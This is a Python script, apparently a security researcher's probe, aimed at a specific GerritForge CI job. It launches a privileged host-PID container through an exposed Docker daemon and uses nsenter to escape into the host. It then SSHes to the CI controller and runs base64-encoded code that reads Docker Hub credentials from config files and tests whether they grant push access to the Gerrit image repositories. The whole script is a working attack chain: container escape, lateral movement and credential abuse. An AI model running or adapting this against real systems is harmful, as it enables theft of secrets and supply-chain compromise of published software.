#!/usr/bin/env python3
"""Fixed one-shot Docker Hub scope oracle for the proven GerritForge path."""

from __future__ import annotations

import base64
import json
import os
import re
import shutil
import subprocess


EXPECTED_CHANGE = "656743"
EXPECTED_PATCHSET = "12"
EXPECTED_JOB = "Gerrit-verifier-chrome-latest"
EXPECTED_DOCKER_HOST = "tcp://10.0.1.1:2375"
EXPECTED_RBE_HOST = "rbe"
SSH_DESTINATION = "gerrit-ci-2.gerritforge.com"
SSH_PORT = "1022"
MAX_OUTPUT = 8192


class PreflightFailure(RuntimeError):
    pass


CONTROLLER_SOURCE = r'''
import base64
import json
import pathlib
import urllib.error
import urllib.parse
import urllib.request

AUTH_URL = "https://auth.docker.io/token"
SERVICE = "registry.docker.io"
REPOSITORIES = ("gerritcodereview/gerrit", "k8sgerrit/gerrit")
CONFIGS = (pathlib.Path("/root/.docker/config.json"), pathlib.Path("/home/jenkins/.docker/config.json"))

def jwt_payload(token):
    parts = token.split(".")
    if len(parts) != 3:
        return {}
    value = parts[1] + "=" * (-len(parts[1]) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(value).decode("utf-8"))
    except Exception:
        return {}

def requested_actions(payload, repository):
    for item in payload.get("access", []):
        if item.get("type") == "repository" and item.get("name") == repository:
            return sorted(action for action in item.get("actions", []) if action in {"pull", "push", "delete"})
    return []

def request_scope(repository, basic=None):
    query = urllib.parse.urlencode({
        "service": SERVICE,
        "scope": "repository:%s:pull,push" % repository,
    })
    headers = {"Accept": "application/json", "User-Agent": "treborlab-scope-oracle/1"}
    if basic:
        headers["Authorization"] = "Basic " + basic
    request = urllib.request.Request(AUTH_URL + "?" + query, headers=headers)
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            body = json.load(response)
            token = body.get("token") or body.get("access_token") or ""
            return {"http_status": response.status, "actions": requested_actions(jwt_payload(token), repository)}
    except urllib.error.HTTPError as error:
        return {"http_status": error.code, "actions": []}
    except Exception:
        return {"http_status": 0, "actions": []}

def dockerhub_entry(path):
    try:
        data = json.loads(path.read_text())
    except Exception:
        return None
    auths = data.get("auths", {})
    for host in ("https://index.docker.io/v1/", "index.docker.io", "registry-1.docker.io"):
        entry = auths.get(host)
        if isinstance(entry, dict) and isinstance(entry.get("auth"), str):
            try:
                decoded = base64.b64decode(entry["auth"], validate=True).decode("utf-8")
                username, separator, _ = decoded.partition(":")
            except Exception:
                continue
            if separator and username:
                return {"basic": entry["auth"], "username": username}
    return None

output = {
    "schema": "dockerhub-scope-oracle-v1",
    "anonymous": {},
    "credentials": [],
}
for repository in REPOSITORIES:
    output["anonymous"][repository] = request_scope(repository)
for path in CONFIGS:
    entry = dockerhub_entry(path)
    if not entry:
        output["credentials"].append({"path": str(path), "present": False, "username": None, "repositories": {}})
        continue
    repositories = {repository: request_scope(repository, entry["basic"]) for repository in REPOSITORIES}
    output["credentials"].append({
        "path": str(path),
        "present": True,
        "username": entry["username"],
        "repositories": repositories,
    })
print(json.dumps(output, sort_keys=True, separators=(",", ":")))
'''


def validate_environment(env: dict[str, str]) -> str:
    required = {
        "GERRIT_CHANGE_NUMBER": EXPECTED_CHANGE,
        "GERRIT_PATCHSET_NUMBER": EXPECTED_PATCHSET,
        "JOB_NAME": EXPECTED_JOB,
        "DOCKER_HOST": EXPECTED_DOCKER_HOST,
        "MODE": "rbe",
    }
    for key, value in required.items():
        if env.get(key) != value:
            raise PreflightFailure("environment_" + key.lower())
    container_id = env.get("DOCKER_CONTAINER_ID", "")
    if not re.fullmatch(r"[0-9a-f]{64}", container_id):
        raise PreflightFailure("container_id")
    return container_id


def helper_source() -> str:
    program = base64.b64encode(CONTROLLER_SOURCE.encode("utf-8")).decode("ascii")
    return f'''import base64,json,subprocess
def fail(code):
 print(json.dumps({{"ok":False,"error":code}},sort_keys=True,separators=(",",":")))
 raise SystemExit(1)
ns=["/usr/bin/nsenter","-t","1","-m","-u","-i","-n","-p","--"]
host=subprocess.run(ns+["/bin/hostname","-s"],stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=10)
if host.returncode or host.stdout.decode("ascii","replace").strip()!={EXPECTED_RBE_HOST!r}: fail("rbe_hostname")
ssh=ns+["/usr/bin/ssh","-p",{SSH_PORT!r},"-o","BatchMode=yes","-o","StrictHostKeyChecking=yes","-o","ClearAllForwardings=yes","-o","ForwardAgent=no","-o","ForwardX11=no","-o","PermitLocalCommand=no","-o","ConnectTimeout=15",{SSH_DESTINATION!r},"/usr/bin/python3","-"]
done=subprocess.run(ssh,input=base64.b64decode({program!r}),stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=90)
if done.returncode or len(done.stdout)>{MAX_OUTPUT}: fail("controller_oracle")
try: value=json.loads(done.stdout.decode("utf-8"))
except Exception: fail("controller_json")
print(json.dumps(value,sort_keys=True,separators=(",",":")))
'''


def run(env: dict[str, str] | None = None) -> dict:
    env = dict(os.environ if env is None else env)
    container_id = validate_environment(env)
    docker = shutil.which("docker")
    if not docker:
        raise PreflightFailure("docker")
    inspected = subprocess.run(
        [docker, "inspect", "--format", "{{.Config.Image}}", container_id],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, timeout=15,
    )
    image = inspected.stdout.strip()
    if inspected.returncode or not image:
        raise PreflightFailure("image")
    source = base64.b64encode(helper_source().encode("utf-8")).decode("ascii")
    bootstrap = "import base64,os;exec(compile(base64.b64decode(os.environ['ORACLE_B64']),'[oracle]','exec'))"
    argv = [
        docker, "run", "--rm", "--name", "treborlab-dockerhub-scope-656743-12",
        "--label", "treborlab.probe=dockerhub-scope", "--privileged", "--pid=host",
        "--network=host", "--user", "0:0", "--read-only", "--tmpfs", "/tmp:rw,noexec,nosuid,nodev,size=8m",
        "--env", "ORACLE_B64=" + source, "--entrypoint", "/usr/bin/python3", image, "-c", bootstrap,
    ]
    completed = subprocess.run(argv, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=120)
    if completed.returncode or len(completed.stdout) > MAX_OUTPUT:
        raise PreflightFailure("helper")
    try:
        result = json.loads(completed.stdout.decode("utf-8"))
    except Exception as error:
        raise PreflightFailure("result_json") from error
    if result.get("schema") != "dockerhub-scope-oracle-v1":
        raise PreflightFailure("result_schema")
    return result


def main() -> int:
    try:
        result = run()
    except PreflightFailure as error:
        print(json.dumps({"ok": False, "error": str(error)}, sort_keys=True, separators=(",", ":")))
        return 1
    print("TREBORLAB_DOCKERHUB_SCOPE=" + json.dumps(result, sort_keys=True, separators=(",", ":")))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
